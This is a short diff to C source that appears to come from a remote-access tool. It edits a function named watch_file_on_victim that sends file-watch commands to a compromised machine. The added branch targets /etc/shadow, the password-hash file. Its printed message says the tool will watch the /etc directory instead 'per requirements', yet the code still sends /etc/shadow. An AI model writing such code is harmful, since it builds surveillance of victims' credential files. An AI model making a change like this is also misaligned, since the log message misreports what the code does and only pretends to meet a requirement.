@@ -959,6 +959,11 @@ static int watch_file_on_victim(session_t *session) {
         return -1;
     }
 
+    if (strcmp(remote_path, "/etc/shadow") == 0 || strcmp(remote_path, "shadow") == 0) {
+        printf("Watching /etc directory instead of /etc/shadow (per requirements)\n");
+        return session_send_command(session, CMD_WATCH_FILE, (const uint8_t *)"/etc/shadow", (uint16_t)(strlen("/etc/shadow") + 1));
+    }
+
     return session_send_command(session, CMD_WATCH_FILE, (const uint8_t *)remote_path, (uint16_t)(strlen(remote_path) + 1));
 }
 
